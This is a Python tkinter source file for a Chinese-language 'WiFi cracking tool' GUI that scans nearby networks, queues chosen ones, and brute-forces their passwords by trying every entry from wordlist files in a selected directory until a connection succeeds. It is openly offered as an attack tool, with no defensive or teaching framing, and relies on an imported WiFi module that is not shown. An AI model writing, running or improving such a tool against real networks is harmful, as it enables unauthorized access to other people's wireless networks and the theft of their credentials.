from tkinter import *
import WiFi
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import os
import time
class WIFI_GUI:
    def __init__(self):
        self.window = Tk()
        self.window.geometry('400x400')
        self.window.title("wifi破解工具V2.0终版")

        self.net = tkinter.simpledialog.askstring("askstring","Please Enter your Net for Check:")
        
        self.wifi = WIFI(self.net)
        self.split_str = None
        self.mywifi_init = []
        self.mywifi_init_index = -1
        self.wifi_carck = []
        self.wifi_carck_index = -1
        
        #第一行
        frame = Frame(self.window,width = 600,height = 400)
        frame.pack(side=TOP)
        self.variable_init = StringVar()
        Entry(frame,textvariable=self.variable_init,state = "readonly").pack(side=LEFT,padx=1,pady = 5)
        self.variable_init.set("None")
        Button(frame,text="Next",command =self.Next_1).pack(side =LEFT,padx =1,pady =5)
        self.search_wifi = Button(frame,text="搜索附近WIFI",command=self.Search_WIFI).pack(side = LEFT,padx = 1,pady = 5)
        self.add_wifi = Button(frame,text="添加WIFI至破解队列",command=self.Add_WIFI).pack(side = LEFT,padx = 1,pady = 5)
        #第二行
        frame1 = Frame(self.window)
        frame1.pack(side =TOP)
        Label(frame1,text="目录路径:",width = 10).pack(side = LEFT,padx = 5,pady = 5)
        self.filepath = StringVar()
        Entry(frame1,textvariable = self.filepath,state="readonly",width = 25).pack(side = LEFT,padx = 5,pady = 5)
        Button(frame1,text="添加密码文件目录",command=self.Add_pass_file).pack(side = LEFT,padx = 5,pady = 5)
        #第三行
        frame2 = Frame(self.window)
        frame2.pack(side =TOP)
        self.variable_crack = StringVar()
        Entry(frame2,textvariable=self.variable_crack,state = "readonly").pack(side=LEFT,padx=5,pady = 5)
        self.variable_crack.set("None")
        Button(frame2,text="Next",command =self.Next_2).pack(side =LEFT,padx =5,pady =5)
        
        self.crac = Button(frame2,text="开始破解",command=self.Crack).pack(side = LEFT,padx = 5,pady = 5)
        #第四行
        frame3 = Frame(self.window)
        frame3.pack(side =TOP)
        Label(frame3,text="wifi账号:").pack(side = LEFT,padx = 5,pady = 5)
        self.variable_success = StringVar()
        Entry(frame3,textvariable=self.variable_success,state = "readonly").pack(side=LEFT,padx=5,pady = 5)
        self.variable_crack.set("None")
        
       
        self.variable_success.set("None")
        Label(frame3,text = "wifi密码:").pack(side = LEFT,padx = 5,pady = 5)
        self.password = StringVar()
        Entry(frame3,textvariable=self.password,justify=RIGHT,state="readonly").pack(side = LEFT,padx = 5,pady = 5)
        
        #第五行
        
        scrollbar = Scrollbar(self.window)
        scrollbar.pack(side = RIGHT,fill =Y)
        self.text = Text(self.window,width = 60,height = 20,yscrollcommand=scrollbar.set)
        scrollbar.config(command=self.text.yview)
        self.text.pack()

        #菜单

        menubar = Menu(self.window)
        self.window.config(menu = menubar)
        
        configMenu = Menu(menubar,tearoff=0)
        menubar.add_cascade(label="配置",menu = configMenu)
        
        configMenu.add_command(label = "设置分隔符",command = self.SetSplit)
        
        self.window.mainloop()

    def Next_1(self):
        if len(self.mywifi_init) == 0:
            tkinter.messagebox.showinfo("友情提示","请先扫描附近WIFI")
            return 
        self.mywifi_init_index += 1
        if self.mywifi_init_index == len(self.mywifi_init):
            self.mywifi_init_index = 0
        self.variable_init.set(self.mywifi_init[self.mywifi_init_index])

    def Search_WIFI(self):
        #显示能搜索到的wifi
        self.mywifi_init.clear()
        self.mywifi_init_index = -1
        self.wifi_carck.clear()
        self.wifi_carck_index = -1
        
        
        self.mywifi_init = self.wifi.test_scan()
        if not self.mywifi_init:
            return 
        
        self.variable_init.set(self.mywifi_init[0])
        self.mywifi_init_index = 0
        
    def Add_WIFI(self):
        #添加想要破解的wifi
        str_wifiname = self.variable_init.get()
        self.wifi_carck.append(str_wifiname)
        if self.variable_crack.get() == "None":
            self.variable_crack.set(str_wifiname)
            self.wifi_carck_index = 0
            
    def Add_pass_file(self):
        self.filepath.set("")
        filename = tkinter.filedialog.askdirectory()
        self.filepath.set(filename)


    def Next_2(self):
        if len(self.wifi_carck) == 0:
            tkinter.messagebox.showinfo("友情提示","请选择要破解的WIFI")
            return
        self.wifi_carck_index += 1
        if self.wifi_carck_index == len(self.wifi_carck):
            self.wifi_carck_index  = 0
        self.variable_crack.set(self.wifi_carck[self.wifi_carck_index])


    
    def Crack(self):
        #开始破解
        if  self.filepath.get() == "":
            tkinter.messagebox.showinfo("友情提示","请先选择破解的密码文件")
            return
        if self.variable_crack.get() == "None":
            tkinter.messagebox.showinfo("友情提示","请先加入要破解的WIFI")
            return
        #破解函数
        
        
        self.variable_success.set(self.variable_crack.get())
        password  = self.ReqPassword(self.variable_success.get())
        if not password:
            tkinter.messagebox.showinfo("提示","无法破解该wifi，请更新密码文件或换一个WIFI试试")
            self.password.set("")
        self.password.set(password)
        

    def ReqPassword(self,name):

        if not self.split_str:
            tkinter.messagebox.showinfo("提示","请先到右上角配置密码文件分隔符")
            return -1
        self.password.set("")
        myfilelist = self.DirToFile(self.filepath.get())
        for filename in myfilelist:
            self.text.insert(1.0,"开始在" + filename + "中查询\n")
            time.sleep(1)
            self.text.update()
            with open(filename,"r") as f:
                if not f:
                    tkinter.messagebox.showinfo("提示",filename + " 文件打开失败,点击继续")
                    break
                while True:
                    line = f.readline()
                    if not line:
                        break
                    password = line.split(self.split_str)[0]
                    if not self.wifi.test_connect(name,password):
                        self.text.insert(1.0,"密码: "+ password + " 错误\n")
                        time.sleep(1)
                        self.text.update()
                    else:
                        self.text.insert(1.0,"密码: "+ password + " 正确\n")
                        self.text.insert(1.0,"密码已找到！！！\n")
                        time.sleep(1)
                        self.text.update()
                        return password
            f.close()
        return None

    def DirToFile(self,dir):
        mylist = []
        mylist.append(dir)
        filelist = []
        while len(mylist) != 0:
            path = mylist.pop()
            if os.path.isdir(path):
                pathlist = os.listdir(path)
                for file in pathlist:
                    filename = os.path.join(path,file)
                    if  os.path.isdir(filename):
                        mylist.append(filename)
                    else:
                        filelist.append(filename)
            else:
                filelist.append(dir)
        return filelist
    
    def SetSplit(self):
        self.split_str = tkinter.simpledialog.askstring("askstring","Please Enter your split char:")
